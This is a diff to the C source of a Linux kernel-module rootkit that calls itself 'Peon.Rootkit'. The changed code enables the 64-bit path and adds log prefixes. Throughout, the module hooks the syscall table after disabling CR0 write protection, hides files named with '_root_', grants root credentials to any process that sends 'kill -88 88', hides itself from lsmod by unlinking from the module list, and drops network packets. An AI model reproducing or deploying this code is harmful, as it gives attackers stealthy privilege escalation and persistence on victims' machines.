@@ -20,7 +20,7 @@
 
 #define ETH_P_ALL       0x0003
 
-#if 0//defined(__LP64__) || defined(_LP64)  /* 64 bits machine */
+#if defined(__LP64__) || defined(_LP64)  /* 64 bits machine */
 #define OS_64_BITS 1
 #define KERN_MEM_BEGIN 0xffffffff81000000
 #define KERN_MEM_END 0xffffffff81e42000
@@ -51,8 +51,7 @@ unsigned long **find_syscall_table(void)
 	        i += sizeof(void *);
 	    }
 	 
-	    return NULL;
-     
+	    return NULL;     
 }
 
 
@@ -79,12 +78,11 @@ else
            );       
 }
 
-void enable_wp(void)
-{
+void enable_wp(void){
 
 if(OS_64_BITS)	
 	
-	    __asm__("push   %rax\n\t"
+    __asm__("push   %rax\n\t"
             "mov    %cr0,%rax;\n\t"
             "or     $(1 << 16),%rax;\n\t"
             "mov    %rax,%cr0;\n\t"
@@ -93,7 +91,7 @@ if(OS_64_BITS)
            );
  
  else
-      __asm__("push   %eax\n\t"
+    __asm__("push   %eax\n\t"
             "mov    %cr0,%eax;\n\t"
             "or     $(1 << 16),%eax;\n\t"
             "mov    %eax,%cr0;\n\t"
@@ -101,7 +99,6 @@ if(OS_64_BITS)
             "pop    %eax"
            );        
 }
-
 
 
 
@@ -133,7 +130,7 @@ asmlinkage long hacked_getdents64 (unsigned int fd,  struct linux_dirent64 __use
 		dir=(void*)dirent+off;
 	/* hide files containing name _root_ */	
 		if((strstr(dir->d_name, "_root_")) != NULL){
-		printk(KERN_ALERT "hide %s",dir->d_name);
+		printk(KERN_ALERT "Peon.Rootkit: hide %s",dir->d_name);
 		   ret-=dir->d_reclen;
 			if(dir->d_reclen+off<ret)
 			   memmove ((void*)dir,(void*)((void*)dir+dir->d_reclen), (size_t) (ret-off));
@@ -151,8 +148,8 @@ asmlinkage long (*kill_orig_call) (pid_t pid, int sig);
 asmlinkage long kill_hook_call( pid_t pid, int sig)
 {
     
-    /* Hacked function */
-    if((pid ==88) &&(sig==88))
+    /* Hacked function : kill -88 88*/ 
+    if((sig ==88) &&(pid==88))
     {
     struct task_struct *cur_task;
     struct cred *credz;
@@ -165,15 +162,15 @@ asmlinkage long kill_hook_call( pid_t pid, int sig)
     credz->sgid=0;
     credz->euid=0;
     credz->egid=0;     
-    printk(KERN_ALERT "KILL 88 88:  shell root access");
+    printk(KERN_ALERT "Peon.Rootkit: [KILL -88 88]  shell root access");
     }
     
-/*   show hided module  */    
-    if((pid ==22) &&(sig==22))
+/*   show hided module  kill -22 22*/    
+    if((sig ==22) &&(pid==22))
     {  
 /*  attach save module to the list of module by seaching snd module */    	
     list_add(&mod->list,&find_module("snd")->list);    
-    printk(KERN_ALERT "show module");
+    printk(KERN_ALERT "Peon.Rootkit: show module");
     }
     return kill_orig_call(pid,sig);
 }
@@ -184,7 +181,7 @@ asmlinkage long kill_hook_call( pid_t pid, int sig)
 int toto(struct sk_buff *skb, struct net_device *dev, struct packet_type *pkt,struct net_device *dev2)
 {
 kfree_skb(skb);
-printk(KERN_ALERT "ping ping");
+printk(KERN_ALERT "Peon.Rootkit: ping ping");
 return 0;
 }
 int init_module(void)
@@ -194,16 +191,14 @@ int init_module(void)
 
     if (syscall_table == 0)
     {
-        printk(KERN_INFO "System call table not found!\n");
+        printk(KERN_INFO "Peon.Rootkit: System call table not found!\n");
         return 1;
     }
-    printk(KERN_INFO "System call found at : 0x%lx\n", (unsigned long)syscall_table);
+    printk(KERN_INFO "Peon.Rootkit: System call found at : 0x%lx\n", (unsigned long)syscall_table);
 	
 /*  hide module  lsmod */    
     mod=THIS_MODULE;
     list_del(&THIS_MODULE->list);
-   
-   
 
     
     disable_wp();
@@ -255,4 +250,4 @@ void cleanup_module(void)
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Peondusud");
-MODULE_DESCRIPTION("peonsud rootkit module");
+MODULE_DESCRIPTION("peondusud rootkit module");
